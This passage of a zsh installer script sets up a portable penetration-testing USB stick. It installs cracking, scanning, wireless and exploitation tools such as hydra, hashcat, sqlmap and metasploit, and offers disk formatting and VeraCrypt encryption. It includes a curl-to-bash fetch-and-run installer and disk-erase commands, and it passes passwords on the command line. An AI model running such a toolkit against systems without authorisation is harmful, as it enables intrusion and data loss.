#!/usr/bin/env zsh
# ╔══════════════════════════════════════════════════════════════════╗
# ║   HACK USB — Setup                                              ║
# ║   macOS · Linux · Windows (WSL2 + Git Bash + Native)           ║
# ║                                                                 ║
# ║   macOS:   zsh hackusb_setup.zsh   (NO sudo needed)            ║
# ║   Linux:   sudo zsh hackusb_setup.zsh                          ║
# ║   WSL:     zsh hackusb_setup.zsh   (sudo apt internally)       ║
# ║   Windows: zsh hackusb_setup.zsh   (Git Bash / winget)         ║
# ║                                                                 ║
# ║   ⚠  USE ON YOUR OWN / AUTHORIZED SYSTEMS ONLY!               ║
# ║   ⚠  CH: Art. 143bis StGB  |  DE: §202a StGB                  ║
# ╚══════════════════════════════════════════════════════════════════╝

setopt NO_UNSET 2>/dev/null || true

# ── Colors ──────────────────────────────────────────────────────────
BOLD='\033[1m'; RED='\033[0;31m'; GREEN='\033[0;32m'
YELLOW='\033[1;33m'; CYAN='\033[0;36m'; DIM='\033[2m'
MAGENTA='\033[0;35m'; NC='\033[0m'

log_ok()    { echo -e "${GREEN}  ✓${NC}  $1" | tee -a "$LOG_FILE" 2>/dev/null; }
log_info()  { echo -e "${CYAN}  →${NC}  $1" | tee -a "$LOG_FILE" 2>/dev/null; }
log_warn()  { echo -e "${YELLOW}  !${NC}  $1" | tee -a "$LOG_FILE" 2>/dev/null; }
log_err()   { echo -e "${RED}  ✗${NC}  $1" | tee -a "$LOG_FILE" 2>/dev/null; }
log_step()  { echo -e "\n${MAGENTA}${BOLD}  ▶ $1${NC}\n" | tee -a "$LOG_FILE" 2>/dev/null; }
section()   { echo -e "\n${CYAN}${BOLD}  ══════════════════════════════════\n  $1\n  ══════════════════════════════════${NC}\n"; }
hr()        { echo -e "  ${DIM}──────────────────────────────────${NC}"; }
ask()       { print -n "  ${CYAN}?${NC}  $1 " && read REPLY; }
ask_secret(){ print -n "  ${CYAN}?${NC}  $1 "; stty -echo 2>/dev/null; read REPLY; stty echo 2>/dev/null; echo ""; }

# ── Global Variables ─────────────────────────────────────────────────
USB_ROOT=""
LOG_FILE="/tmp/hackusb_setup.log"
OS_TYPE=""          # macos | linux | windows_wsl | windows_native
PKG_MGR=""          # brew | apt | pacman | dnf | choco | winget
REAL_USER=""
REAL_HOME=""
SHELL_RC=""
TOTAL_NEEDED_GB=0
USB_SIZE_GB=0
INSTALL_PROFILE=""
ENABLE_AUTOUPDATE=0
ENABLE_VAULT=0
ENABLE_ADBLOCKER=0
VAULT_SIZE_MB=500
VAULT_PASS=""
NODE_VERSION="20"
MANUAL_OS_CHOICE=0   # set to 1 if user picked OS manually

# ╔══════════════════════════════════════════════════════════╗
# ║  REAL USER DETECTION                                    ║
# ╚══════════════════════════════════════════════════════════╝
_detect_real_user() {
  if [[ -n "${SUDO_USER:-}" && "$SUDO_USER" != "root" ]]; then
    REAL_USER="$SUDO_USER"
    REAL_HOME=$(eval echo "~$SUDO_USER")
  elif [[ -n "${LOGNAME:-}" && "$LOGNAME" != "root" ]]; then
    REAL_USER="$LOGNAME"
    REAL_HOME=$(eval echo "~$LOGNAME")
  elif [[ -n "${USER:-}" && "$USER" != "root" ]]; then
    REAL_USER="$USER"
    REAL_HOME="$HOME"
  else
    REAL_USER="root"
    REAL_HOME="/root"
  fi

  local shell_name; shell_name=$(basename "${SHELL:-/bin/zsh}")
  case "$shell_name" in
    zsh)  SHELL_RC="$REAL_HOME/.zshrc" ;;
    bash) SHELL_RC="$REAL_HOME/.bashrc" ;;
    *)    SHELL_RC="$REAL_HOME/.profile" ;;
  esac
  [[ -f "$SHELL_RC" ]] || touch "$SHELL_RC" 2>/dev/null || true
}

# Run command as real (non-root) user
run_as_user() {
  if [[ "$REAL_USER" != "root" ]] && [[ "$(id -u)" -eq 0 ]]; then
    su -l "$REAL_USER" -c "$*" 2>/dev/null \
      || sudo -u "$REAL_USER" env HOME="$REAL_HOME" "$@" 2>/dev/null \
      || eval "$@"
  else
    eval "$@"
  fi
}

# ── Banner ───────────────────────────────────────────────────────────
show_banner() {
  clear
  echo -e "${RED}${BOLD}"
  echo "  ██╗  ██╗ █████╗  ██████╗██╗  ██╗    ██╗   ██╗███████╗██████╗ "
  echo "  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ██║   ██║██╔════╝██╔══██╗"
  echo "  ███████║███████║██║     █████╔╝     ██║   ██║███████╗██████╔╝ "
  echo "  ██╔══██║██╔══██║██║     ██╔═██╗     ██║   ██║╚════██║██╔══██╗ "
  echo "  ██║  ██║██║  ██║╚██████╗██║  ██╗    ╚██████╔╝███████║██████╔╝ "
  echo "  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═════╝ ╚══════╝╚═════╝  "
  echo -e "${NC}"
  echo -e "  ${DIM}Ethical Pentesting USB — hackusb${NC}"
  echo -e "  ${DIM}macOS · Linux · Windows (WSL2 / Git Bash / Native)${NC}"
  echo ""; hr
  echo -e "  ${YELLOW}${BOLD}⚠  USE ON YOUR OWN / AUTHORIZED SYSTEMS ONLY!${NC}"
  echo -e "  ${DIM}CH: Art. 143bis StGB  |  DE: §202a StGB  |  US: CFAA 18 U.S.C. §1030${NC}"
  hr; echo ""; sleep 1
}

# ╔══════════════════════════════════════════════════════════╗
# ║  STEP 0 — CHOOSE YOUR OS (shown before auto-detect)     ║
# ╚══════════════════════════════════════════════════════════╝
choose_os() {
  section "STEP 0 — SELECT YOUR OPERATING SYSTEM"
  echo -e "  ${GREEN}[1]${NC}  macOS          (Homebrew, Apple Silicon & Intel)"
  echo -e "  ${CYAN}[2]${NC}  Linux          (apt / pacman / dnf / zypper)"
  echo -e "  ${YELLOW}[3]${NC}  Windows WSL2   (Ubuntu inside Windows)"
  echo -e "  ${MAGENTA}[4]${NC}  Windows Native (Git Bash / winget / choco)"
  echo -e "  ${DIM}[5]${NC}  Auto-Detect    (let the script decide)"
  echo ""
  while true; do
    ask "Your system [1/2/3/4/5, Enter=5]:"
    case "${REPLY:-5}" in
      1)
        OS_TYPE="macos"; PKG_MGR="brew"
        log_ok "Selected: macOS"
        MANUAL_OS_CHOICE=1; break ;;
      2)
        OS_TYPE="linux"
        echo ""
        echo -e "  ${DIM}Package manager:${NC}"
        echo -e "  ${GREEN}[1]${NC} apt    (Ubuntu/Debian/Kali/Parrot)"
        echo -e "  ${CYAN}[2]${NC} pacman (Arch/Manjaro/BlackArch)"
        echo -e "  ${YELLOW}[3]${NC} dnf    (Fedora/RHEL/CentOS)"
        echo -e "  ${DIM}[4]${NC} zypper (openSUSE)"
        ask "Package manager [1/2/3/4, Enter=1]:"
        case "${REPLY:-1}" in
          2) PKG_MGR="pacman" ;;
          3) PKG_MGR="dnf" ;;
          4) PKG_MGR="zypper" ;;
          *) PKG_MGR="apt" ;;
        esac
        log_ok "Selected: Linux ($PKG_MGR)"
        MANUAL_OS_CHOICE=1; break ;;
      3)
        OS_TYPE="windows_wsl"; PKG_MGR="apt"
        log_ok "Selected: Windows WSL2 (apt)"
        MANUAL_OS_CHOICE=1; break ;;
      4)
        OS_TYPE="windows_native"
        echo ""
        echo -e "  ${DIM}Windows package manager:${NC}"
        echo -e "  ${GREEN}[1]${NC} winget  (built-in, Windows 10+)"
        echo -e "  ${CYAN}[2]${NC} choco   (Chocolatey)"
        echo -e "  ${YELLOW}[3]${NC} scoop   (Scoop)"
        ask "Package manager [1/2/3, Enter=1]:"
        case "${REPLY:-1}" in
          2) PKG_MGR="choco" ;;
          3) PKG_MGR="scoop" ;;
          *) PKG_MGR="winget" ;;
        esac
        log_ok "Selected: Windows Native ($PKG_MGR)"
        MANUAL_OS_CHOICE=1; break ;;
      5)
        log_info "Auto-detecting OS..."; break ;;
      *)
        log_err "Please enter 1, 2, 3, 4 or 5" ;;
    esac
  done
  echo ""
}

# ╔══════════════════════════════════════════════════════════╗
# ║  STEP 1 — AUTO-DETECT OS (skipped if manually chosen)  ║
# ╚══════════════════════════════════════════════════════════╝
detect_os() {
  _detect_real_user

  if [[ $MANUAL_OS_CHOICE -eq 1 ]]; then
    section "STEP 1 — SYSTEM"
    echo -e "  ${DIM}User: ${CYAN}$REAL_USER${NC}  Home: ${CYAN}$REAL_HOME${NC}"
    echo -e "  ${DIM}Shell RC: ${CYAN}$SHELL_RC${NC}"
    echo -e "  ${DIM}OS: ${CYAN}$OS_TYPE${NC}  PKG: ${CYAN}$PKG_MGR${NC}\n"

    # macOS: Xcode CLT + Homebrew check even when manually chosen
    if [[ "$OS_TYPE" == "macos" ]]; then
      _macos_prereqs
    fi
    return
  fi

  section "STEP 1 — AUTO-DETECT SYSTEM"
  echo -e "  ${DIM}User: ${CYAN}$REAL_USER${NC}  Home: ${CYAN}$REAL_HOME${NC}"
  echo -e "  ${DIM}Shell RC: ${CYAN}$SHELL_RC${NC}\n"

  local u; u=$(uname -s 2>/dev/null || echo "Unknown")
  case "$u" in
    Darwin*)
      OS_TYPE="macos"; PKG_MGR="brew"
      log_ok "macOS $(sw_vers -productVersion 2>/dev/null)"
      if [[ "$(id -u)" -eq 0 ]]; then
        log_warn "Running as root (sudo) — brew will run as '$REAL_USER'"
        log_info "  Tip: On macOS, run WITHOUT sudo: zsh hackusb_setup.zsh"
      fi
      _macos_prereqs
      ;;
    Linux*)
      if grep -qi microsoft /proc/version 2>/dev/null; then
        OS_TYPE="windows_wsl"
        log_ok "Windows WSL2 detected"
      else
        OS_TYPE="linux"
        log_ok "Linux — Kernel $(uname -r)"
      fi
      if   command -v apt-get &>/dev/null; then PKG_MGR="apt"
      elif command -v pacman  &>/dev/null; then PKG_MGR="pacman"
      elif command -v dnf     &>/dev/null; then PKG_MGR="dnf"
      elif command -v zypper  &>/dev/null; then PKG_MGR="zypper"
      else PKG_MGR="unknown"; fi
      log_ok "Package manager: $PKG_MGR"
      ;;
    MINGW*|CYGWIN*|MSYS*)
      OS_TYPE="windows_native"
      log_ok "Windows (Git Bash / MSYS2 / Cygwin) detected"
      if   command -v winget &>/dev/null; then PKG_MGR="winget"
      elif command -v choco  &>/dev/null; then PKG_MGR="choco"
      elif command -v scoop  &>/dev/null; then PKG_MGR="scoop"
      else PKG_MGR="manual"; fi
      log_ok "Windows package manager: $PKG_MGR"
      echo ""
      echo -e "  ${CYAN}Windows recommendations:${NC}"
      echo -e "  ${GREEN}  ✓${NC}  Install WSL2 for full Linux tool compatibility"
      echo -e "  ${YELLOW}  !${NC}  Many tools only work in WSL2 (aircrack, hydra, ...)"
      echo ""
      ask "  Show WSL2 setup instructions? [y/N]"
      [[ $REPLY =~ ^[Yy]$ ]] && _show_wsl_setup
      ;;
    *)
      OS_TYPE="linux"; PKG_MGR="apt"
      log_warn "Unknown system — assuming Linux/apt" ;;
  esac

  echo -e "\n  ${DIM}OS: ${CYAN}$OS_TYPE${NC}  PKG: ${CYAN}$PKG_MGR${NC}\n"
}

_macos_prereqs() {
  if ! xcode-select -p &>/dev/null; then
    log_warn "Xcode CLT missing (needed for: gcc, make, git, curl)"
    ask "Install now? [Y/n]"
    if [[ ! $REPLY =~ ^[Nn]$ ]]; then
      run_as_user "xcode-select --install" 2>/dev/null || true
      echo -e "  ${YELLOW}→ Wait for installation, then press Enter...${NC}"; read
    fi
  else
    log_ok "Xcode CLT: $(xcode-select -p)"
  fi

  local brew_ok=0
  if run_as_user "command -v brew" &>/dev/null 2>&1; then
    brew_ok=1
    local brew_path; brew_path=$(run_as_user "brew --prefix" 2>/dev/null || echo "/opt/homebrew")
    log_ok "Homebrew: $brew_path"
  else
    log_warn "Homebrew missing"
    ask "Install Homebrew? [Y/n]"
    if [[ ! $REPLY =~ ^[Nn]$ ]]; then
      log_info "Installing Homebrew as $REAL_USER ..."
      run_as_user '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"' >> "$LOG_FILE" 2>&1
      local brew_bin="/opt/homebrew/bin/brew"
      [[ -f "$brew_bin" ]] || brew_bin="/usr/local/bin/brew"
      if [[ -f "$brew_bin" ]]; then
        eval "$("$brew_bin" shellenv)" 2>/dev/null || true
        grep -q "brew shellenv" "$SHELL_RC" 2>/dev/null || \
          echo "eval \"\$(${brew_bin} shellenv)\"" >> "$SHELL_RC"
        brew_ok=1
        log_ok "Homebrew installed"
      else
        log_err "Homebrew install failed — manual: https://brew.sh"
      fi
    fi
    if [[ $brew_ok -eq 0 ]]; then
      log_err "Homebrew required on macOS"; exit 1
    fi
  fi

  for brew_prefix in /opt/homebrew /usr/local; do
    [[ -f "$brew_prefix/bin/brew" ]] && eval "$("$brew_prefix/bin/brew" shellenv)" 2>/dev/null && break
  done
}

_show_wsl_setup() {
  echo ""
  echo -e "  ${CYAN}${BOLD}WSL2 SETUP — PowerShell as Administrator${NC}"
  echo ""
  echo -e "  ${DIM}1. Install WSL2 + Ubuntu:${NC}"
  echo -e "     ${GREEN}wsl --install${NC}"
  echo -e "     ${DIM}→ After reboot: create Ubuntu user${NC}"
  echo ""
  echo -e "  ${DIM}2. Find USB stick in WSL2:${NC}"
  echo -e "     ${GREEN}ls /mnt/  ${DIM}# e.g. /mnt/e/ for drive E:${NC}"
  echo ""
  echo -e "  ${DIM}3. Run script in WSL2:${NC}"
  echo -e "     ${GREEN}sudo zsh hackusb_setup.zsh${NC}"
  echo ""
  ask "  Continue with Git Bash (limited)? [Y/n]"
  [[ $REPLY =~ ^[Nn]$ ]] && exit 0
}

# ╔══════════════════════════════════════════════════════════╗
# ║  STEP 2 — STICK SIZE                                    ║
# ╚══════════════════════════════════════════════════════════╝
choose_usb_size() {
  section "STEP 2 — STICK SIZE"
  echo -e "  ${GREEN}[16 GB]${NC}  minimal  — Base tools, rockyou, cheatsheet"
  echo -e "  ${YELLOW}[32 GB]${NC}  standard — + SecLists, post-exploit, wireless"
  echo -e "  ${RED}[64 GB]${NC}  full     — + ISOs (Kali/Parrot) + everything"
  echo ""
  while true; do
    ask "Stick size [16/32/64]:"
    case "$REPLY" in
      16) USB_SIZE_GB=16; INSTALL_PROFILE="minimal";  TOTAL_NEEDED_GB=8;  break ;;
      32) USB_SIZE_GB=32; INSTALL_PROFILE="standard"; TOTAL_NEEDED_GB=18; break ;;
      64) USB_SIZE_GB=64; INSTALL_PROFILE="full";     TOTAL_NEEDED_GB=26; break ;;
      *) log_err "Please enter 16, 32 or 64" ;;
    esac
  done
  log_ok "${USB_SIZE_GB} GB → Profile: ${INSTALL_PROFILE}"
}

# ╔══════════════════════════════════════════════════════════╗
# ║  STEP 3 — TARGET PATH                                   ║
# ╚══════════════════════════════════════════════════════════╝
choose_target_path() {
  section "STEP 3 — USB STICK PATH"
  local suggested=""
  case "$OS_TYPE" in
    macos)          suggested="/Volumes/HACKUSB" ;;
    linux)          suggested="/media/$REAL_USER/HACKUSB" ;;
    windows_wsl)    suggested="/mnt/e/HACKUSB" ;;
    windows_native) suggested="/e/HACKUSB" ;;
  esac
  echo -e "  ${DIM}macOS:           /Volumes/HACKUSB${NC}"
  echo -e "  ${DIM}Linux:           /media/\$USER/HACKUSB${NC}"
  echo -e "  ${DIM}Windows WSL2:    /mnt/e/HACKUSB  (e = drive letter)${NC}"
  echo -e "  ${DIM}Windows GitBash: /e/HACKUSB  or  /c/HACKUSB${NC}"
  echo ""
  ask "Path [Enter = $suggested]:"
  [[ -z "$REPLY" ]] && USB_ROOT="$suggested" || USB_ROOT="$REPLY"
  LOG_FILE="$USB_ROOT/setup.log"
  mkdir -p "$USB_ROOT" 2>/dev/null \
    || { log_err "Cannot create $USB_ROOT — stick mounted and writable?"; exit 1; }
  touch "$LOG_FILE" 2>/dev/null || true
  log_ok "Target: $USB_ROOT"

  local free_gb=0
  case "$OS_TYPE" in
    macos) free_gb=$(df -g "$USB_ROOT" 2>/dev/null | awk 'NR==2{print $4}') ;;
    *)     free_gb=$(df -BG "$USB_ROOT" 2>/dev/null | awk 'NR==2{gsub("G",""); print $4}') ;;
  esac
  free_gb=${free_gb:-99}
  if (( free_gb < TOTAL_NEEDED_GB )); then
    log_warn "Only ${free_gb} GB free — need ~${TOTAL_NEEDED_GB} GB"
    ask "Continue anyway? [y/N]"
    [[ ! $REPLY =~ ^[Yy]$ ]] && { log_err "Aborted."; exit 1; }
  else
    log_ok "Free space: ${free_gb} GB"
  fi
}

# ╔══════════════════════════════════════════════════════════╗
# ║  STEP 4 — OPTIONAL FEATURES                             ║
# ╚══════════════════════════════════════════════════════════╝
choose_features() {
  section "STEP 4 — OPTIONAL FEATURES"

  echo -e "  ${CYAN}[1] AUTO-UPDATE${NC}  hackusb_update.zsh"
  ask "  Enable? [Y/n]"
  [[ ! $REPLY =~ ^[Nn]$ ]] && { ENABLE_AUTOUPDATE=1; log_ok "Auto-Update: ON"; } || log_info "Auto-Update: off"

  echo ""
  echo -e "  ${CYAN}[2] ENCRYPTED VAULT${NC}  VeraCrypt AES-256"
  ask "  Enable? [Y/n]"
  if [[ ! $REPLY =~ ^[Nn]$ ]]; then
    ENABLE_VAULT=1
    ask "  Vault size in MB [Enter=500]:"
    [[ "$REPLY" =~ ^[0-9]+$ ]] && VAULT_SIZE_MB="$REPLY"
    ask_secret "  Vault password:"
    local p1="$REPLY"
    ask_secret "  Repeat password:"
    if [[ "$p1" == "$REPLY" && -n "$p1" ]]; then
      VAULT_PASS="$p1"; log_ok "Vault: ON  (${VAULT_SIZE_MB} MB · AES-256)"
    else
      log_warn "Passwords don't match — vault disabled"; ENABLE_VAULT=0
    fi
  else
    log_info "Vault: off"
  fi

  echo ""
  echo -e "  ${CYAN}[3] AD-BLOCKER${NC}  Hagezi Pro + Malware (~100K domains)"
  ask "  Enable? [Y/n]"
  [[ ! $REPLY =~ ^[Nn]$ ]] && { ENABLE_ADBLOCKER=1; log_ok "Ad-Blocker: ON"; } || log_info "Ad-Blocker: off"

  echo ""
}

# ╔══════════════════════════════════════════════════════════╗
# ║  STEP 5 — USB PREPARE                                   ║
# ╚══════════════════════════════════════════════════════════╝
prepare_usb() {
  section "STEP 5 — PREPARE USB STICK"
  echo -e "  ${GREEN}[1]${NC} Skip — stick already formatted"
  echo -e "  ${YELLOW}[2]${NC} Format only — ExFAT (all data erased!)"
  echo -e "  ${CYAN}[3]${NC} Format + password protection (Vault or full encryption)"
  echo -e "  ${MAGENTA}[4]${NC} Backup & format — backup first, then reformat"
  echo ""
  ask "Option [1/2/3/4, Enter=1]:"
  case "${REPLY:-1}" in
    1) log_ok "Skipped" ;;
    2) _format_usb_exfat ;;
    3) _format_usb_exfat; _encrypt_usb_choice ;;
    4) _backup_usb; _format_usb_exfat ;;
    *) log_warn "Invalid input — skipped" ;;
  esac
}

_format_usb_exfat() {
  echo ""
  echo -e "  ${RED}${BOLD}⚠ WARNING: ALL DATA ON THE STICK WILL BE ERASED!${NC}"
  echo ""
  case "$OS_TYPE" in
    macos)
      echo -e "  ${DIM}Available external drives:${NC}"
      diskutil list | grep -E "external" -A5 2>/dev/null || diskutil list | tail -15
      echo ""
      ask "Disk identifier (e.g. disk2 or disk2s1):"
      local disk="$REPLY"
      [[ -z "$disk" ]] && { log_warn "No drive selected — skipped"; return; }
      ask "Sure? All data on /dev/$disk will be erased! Type 'YES':"
      [[ "$REPLY" != "YES" ]] && { log_info "Aborted"; return; }
      log_info "Formatting /dev/$disk as ExFAT → HACKUSB ..."
      diskutil eraseDisk ExFAT HACKUSB "/dev/$disk" >> "$LOG_FILE" 2>&1 \
        && log_ok "Done — mounted at: /Volumes/HACKUSB" \
        || { log_warn "eraseDisk failed — trying eraseVolume..."
             diskutil eraseVolume ExFAT HACKUSB "/dev/$disk" >> "$LOG_FILE" 2>&1 \
               && log_ok "eraseVolume OK" \
               || log_err "Failed — use Disk Utility manually"; }
      ;;
    linux|windows_wsl)
      echo -e "  ${DIM}Available drives (lsblk):${NC}"
      lsblk -o NAME,SIZE,TYPE,MOUNTPOINT,LABEL 2>/dev/null | grep -v loop
      echo ""
      ask "Block device (e.g. sdb1 — NOT sda!):"
      local dev="$REPLY"
      [[ -z "$dev" ]] && { log_warn "No device — skipped"; return; }
      [[ "$dev" == "sda" || "$dev" == "nvme0n1" ]] && { log_err "System drive! Aborted."; return; }
      ask "Sure? All data on /dev/$dev will be erased! Type 'YES':"
      [[ "$REPLY" != "YES" ]] && { log_info "Aborted"; return; }
      sudo umount "/dev/$dev" 2>/dev/null || true
      command -v mkfs.exfat &>/dev/null || sudo apt-get install -y -qq exfatprogs 2>/dev/null \
        || sudo apt-get install -y -qq exfat-fuse exfat-utils 2>/dev/null || true
      if command -v mkfs.exfat &>/dev/null; then
        sudo mkfs.exfat -n "HACKUSB" "/dev/$dev" >> "$LOG_FILE" 2>&1 \
          && log_ok "ExFAT formatted: /dev/$dev" \
          || log_err "mkfs.exfat failed"
      else
        log_warn "ExFAT unavailable — formatting as FAT32"
        sudo mkfs.vfat -F 32 -n "HACKUSB" "/dev/$dev" >> "$LOG_FILE" 2>&1 \
          && log_ok "FAT32 formatted (max 4 GB/file)" \
          || log_err "Format failed"
      fi
      sudo mkdir -p "/media/$REAL_USER/HACKUSB" 2>/dev/null || true
      sudo mount "/dev/$dev" "/media/$REAL_USER/HACKUSB" 2>/dev/null \
        && log_ok "Mounted: /media/$REAL_USER/HACKUSB" \
        || log_info "Mount manually: sudo mount /dev/$dev /media/$REAL_USER/HACKUSB"
      ;;
    windows_native)
      log_info "Windows: format via Disk Management or PowerShell"
      echo -e "  ${DIM}PowerShell (as Admin):${NC}"
      echo -e "  ${GREEN}Format-Volume -DriveLetter E -FileSystem exFAT -NewFileSystemLabel HACKUSB${NC}"
      ;;
  esac
}

_backup_usb() {
  ask "Mount point of stick to backup:"
  local src="$REPLY"
  [[ ! -d "$src" ]] && { log_warn "Not found — backup skipped"; return; }
  local dst="$REAL_HOME/hackusb_backup_$(date +%Y%m%d_%H%M%S)"
  mkdir -p "$dst"
  log_info "Backup: $src → $dst ..."
  command -v rsync &>/dev/null \
    && rsync -ah --progress "$src/" "$dst/" 2>&1 | tail -3 \
    || cp -r "$src/." "$dst/"
  log_ok "Backup done: $dst  ($(du -sh "$dst" | cut -f1))"
}

_encrypt_usb_choice() {
  echo ""
  echo -e "  ${CYAN}Encryption option:${NC}"
  echo -e "  ${GREEN}[1]${NC} Vault only (recommended) — secrets.vc AES-256, rest unencrypted"
  echo -e "  ${YELLOW}[2]${NC} Full encryption — entire stick via VeraCrypt"
  echo -e "  ${DIM}[3]${NC} Skip"
  ask "Option [1/2/3, Enter=1]:"
  case "${REPLY:-1}" in
    1) ENABLE_VAULT=1; log_ok "Vault encryption enabled" ;;
    2) _full_encrypt_usb ;;
    *) log_info "Skipped" ;;
  esac
}

_full_encrypt_usb() {
  command -v veracrypt &>/dev/null || { log_warn "VeraCrypt not installed — https://veracrypt.fr"; return; }
  echo ""
  case "$OS_TYPE" in
    macos) diskutil list | grep external -A2 ;;
    *)     lsblk -o NAME,SIZE,TYPE,LABEL | grep -v loop ;;
  esac
  ask "Block device for full encryption (e.g. /dev/disk2 or /dev/sdb):"
  local full_dev="$REPLY"; [[ -z "$full_dev" ]] && return
  ask_secret "Password:"; local enc_pass="$REPLY"
  ask_secret "Repeat password:"
  [[ "$REPLY" != "$enc_pass" || -z "$enc_pass" ]] && { log_err "Passwords don't match"; return; }
  echo -e "\n  ${RED}⚠ LAST WARNING: $full_dev will be COMPLETELY encrypted!${NC}"
  ask "Continue? Type 'YES':"
  [[ "$REPLY" != "YES" ]] && return
  log_info "Full encryption (takes 10–30 min)..."
  veracrypt --text --create "$full_dev" \
    --volume-type=normal --encryption=AES --hash=SHA-512 \
    --filesystem=exFAT --password="$enc_pass" \
    --random-source=/dev/urandom --non-interactive >> "$LOG_FILE" 2>&1 \
    && log_ok "Stick encrypted! Mount: veracrypt $full_dev /Volumes/HACKUSB" \
    || log_err "Failed — details: $LOG_FILE"
  log_warn "SAVE YOUR PASSWORD SECURELY (KeePass, Bitwarden)!"
}

# ╔══════════════════════════════════════════════════════════╗
# ║  STEP 6 — INSTALL DEPENDENCIES                          ║
# ╚══════════════════════════════════════════════════════════╝
install_all_deps() {
  section "STEP 6 — INSTALL DEPENDENCIES"
  echo -e "  ${DIM}Python3 · Node.js 20 LTS · Go · Ruby · Rust · gcc · libpcap · hack tools${NC}\n"
  ask "Auto-install all dependencies? [Y/n]"
  if [[ $REPLY =~ ^[Nn]$ ]]; then
    log_warn "Skipped — some tools may not work"
    return
  fi
  echo ""
  case "$OS_TYPE" in
    macos)          _install_macos ;;
    linux)          _install_linux ;;
    windows_wsl)    _install_wsl ;;
    windows_native) _install_windows_native ;;
  esac
  _install_nodejs
  _install_ruby
  _install_rust
  _install_go_tools
  _install_pip_tools
  _persist_path
}

# ── macOS via Homebrew ───────────────────────────────────────────────
_install_macos() {
  log_step "HOMEBREW PACKAGES (as $REAL_USER)"
  _brew() { run_as_user "brew $*"; }
  _brew "update --quiet" >> "$LOG_FILE" 2>&1 || true

  local pkgs=(
    # Base
    git curl wget jq zsh openssl@3 coreutils
    # Runtimes
    python3 go ruby rust
    # Network / Pentest
    nmap netcat hydra masscan tcpdump
    # Web
    sqlmap nikto gobuster ffuf
    # Password
    hashcat john-jumbo
    # Forensics
    binwalk exiftool steghide foremost
    # Wireless
    aircrack-ng libpcap hcxtools
    # Extras
    metasploit theharvester
    # Utils
    tmux fzf bat ripgrep
  )

  local i=0 total=${#pkgs[@]}
  for pkg in "${pkgs[@]}"; do
    i=$(( i + 1 ))
    if run_as_user "brew list $pkg" &>/dev/null 2>&1; then
      log_ok "[$i/$total] $pkg — already installed"
    else
      log_info "[$i/$total] brew install $pkg ..."
      run_as_user "brew install $pkg" >> "$LOG_FILE" 2>&1 \
        && log_ok "[$i/$total] $pkg ✓" \
        || log_warn "[$i/$total] $pkg — failed"
    fi
  done

  if [[ $ENABLE_VAULT -eq 1 ]]; then
    run_as_user "brew list --cask veracrypt" &>/dev/null 2>&1 \
      || { log_info "Installing VeraCrypt..."; run_as_user "brew install --cask veracrypt" >> "$LOG_FILE" 2>&1 \
           && log_ok "VeraCrypt ✓" || log_warn "VeraCrypt failed — https://veracrypt.fr"; }
  fi
}

# ── Linux via apt/pacman/dnf ─────────────────────────────────────────
_install_linux() {
  log_step "LINUX SYSTEM PACKAGES ($PKG_MGR)"
  case "$PKG_MGR" in
    apt)
      sudo apt-get update -qq >> "$LOG_FILE" 2>&1
      local pkgs=(
        git curl wget jq zsh bash
        build-essential make gcc g++ cmake
        libssl-dev libffi-dev libpcap-dev libpq-dev libsqlite3-dev
        python3 python3-pip python3-venv python3-dev
        ruby ruby-dev rubygems
        golang-go
        nmap ncat hydra john hashcat sqlmap nikto gobuster ffuf masscan
        binwalk exiftool steghide foremost aircrack-ng hcxtools hcxdumptool
        netdiscover wireshark-common tcpdump tshark
        tmux fzf bat ripgrep jq
        metasploit-framework
      )
      for pkg in "${pkgs[@]}"; do
        sudo apt-get install -y -qq "$pkg" >> "$LOG_FILE" 2>&1 \
          && log_ok "$pkg ✓" || log_warn "$pkg — unavailable"
      done
      if [[ $ENABLE_VAULT -eq 1 ]] && ! command -v veracrypt &>/dev/null; then
        command -v flatpak &>/dev/null \
          && flatpak install -y flathub org.veracrypt.VeraCrypt >> "$LOG_FILE" 2>&1 \
          && log_ok "VeraCrypt (Flatpak) ✓" \
          || log_warn "VeraCrypt: install manually — https://veracrypt.fr"
      fi ;;
    pacman)
      sudo pacman -Sy --noconfirm git curl wget jq zsh python python-pip go ruby \
        gcc make openssl libpcap nmap hydra john hashcat sqlmap nikto \
        gobuster masscan binwalk perl-image-exiftool steghide aircrack-ng \
        tmux fzf bat ripgrep >> "$LOG_FILE" 2>&1 \
        && log_ok "Pacman packages ✓" || log_warn "Some packages failed" ;;
    dnf)
      sudo dnf install -y git curl wget jq zsh python3 python3-pip golang ruby \
        gcc make openssl-devel libpcap-devel nmap hydra john hashcat \
        nikto masscan binwalk perl-Image-ExifTool aircrack-ng \
        tmux fzf bat ripgrep >> "$LOG_FILE" 2>&1 \
        && log_ok "DNF packages ✓" || log_warn "Some packages failed" ;;
    zypper)
      sudo zypper install -y git curl wget jq zsh python3 python3-pip go ruby \
        gcc make libopenssl-devel libpcap-devel nmap hydra john hashcat \
        nikto masscan binwalk exiftool aircrack-ng tmux fzf ripgrep >> "$LOG_FILE" 2>&1 \
        && log_ok "Zypper packages ✓" || log_warn "Some packages failed" ;;
    *)
      log_warn "Unknown package manager — install manually"
      log_info "  Needs: git curl wget python3 pip3 go ruby gcc make libpcap nmap hydra john hashcat" ;;
  esac
}

# ── Windows WSL2 ─────────────────────────────────────────────────────
_install_wsl() {
  log_step "WINDOWS WSL2 — APT PACKAGES"
  sudo apt-get update -qq >> "$LOG_FILE" 2>&1
  local pkgs=(
    git curl wget jq zsh
    build-essential make gcc g++ cmake
    libssl-dev libffi-dev libpcap-dev
    python3 python3-pip python3-venv python3-dev
    ruby ruby-dev rubygems
    golang-go
    nmap ncat hydra john hashcat sqlmap nikto gobuster ffuf masscan
    binwalk exiftool steghide foremost aircrack-ng
    tmux fzf bat ripgrep
    wslu
  )
  for pkg in "${pkgs[@]}"; do
    sudo apt-get install -y -qq "$pkg" >> "$LOG_FILE" 2>&1 \
      && log_ok "$pkg ✓" || log_warn "$pkg — unavailable"
  done

  echo ""
  log_info "Windows-side tools (run in PowerShell as Admin):"
  echo -e "  ${GREEN}  winget install --id Git.Git${NC}"
  echo -e "  ${GREEN}  winget install --id Python.Python.3.12${NC}"
  echo -e "  ${GREEN}  winget install --id Golang.Go${NC}"
  echo -e "  ${GREEN}  winget install --id Nmap.Nmap${NC}"
  echo -e "  ${GREEN}  winget install --id VeraCrypt.VeraCrypt${NC}"
}

# ── Windows Native (Git Bash) ─────────────────────────────────────────
_install_windows_native() {
